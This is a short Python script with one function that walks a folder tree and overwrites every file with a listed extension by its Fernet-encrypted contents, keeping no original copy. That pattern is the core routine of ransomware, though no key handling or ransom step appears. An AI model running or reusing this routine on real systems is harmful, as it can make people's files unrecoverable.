#!/usr/bin/env python
import os

# define function to encrypt all the files in a folder
def encrypt_files_in_dir_recursively(fernet, dir, extensions_to_encrypt):
  directories = os.listdir(dir)
  for filename in directories:
    full_path = os.path.join(dir, filename)
    if os.path.isdir(full_path):
      encrypt_files_in_dir_recursively(fernet, full_path, extensions_to_encrypt)
    else:
      extension = os.path.splitext(filename)[-1]
      print(extension, extension in extensions_to_encrypt)
      if extension in extensions_to_encrypt:
        # opening the original file to decrypt
        file = open(full_path, 'rb')
        original = file.read()
        # encrypting the file
        encrypted = fernet.encrypt(original)
        # opening the file in write mode and
        # writing the encrypted data
        encrypted_file = open(full_path, 'wb')
        encrypted_file.write(encrypted)
        encrypted_file.close()
